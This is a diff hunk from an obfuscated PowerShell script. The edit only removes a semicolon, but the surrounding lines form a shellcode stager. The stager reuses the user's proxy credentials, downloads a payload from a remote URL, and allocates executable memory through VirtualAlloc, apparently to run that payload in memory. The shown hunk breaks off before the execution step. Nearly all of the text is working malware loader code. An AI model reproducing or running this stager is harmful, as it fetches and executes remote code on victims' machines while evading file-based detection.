@@ -17,7 +17,7 @@ function var4 {
         $var6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var5, $var7).SetImplementationFlags('Runtime, Managed')
         return $var6.CreateType()
 }
-[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
 [Byte[]]$var8 = (New-Object System.Net.WebClient).DownloadData("[URL]")
 
 $var9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll VirtualAlloc), (var4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var8.Length,0x3000, 0x40)
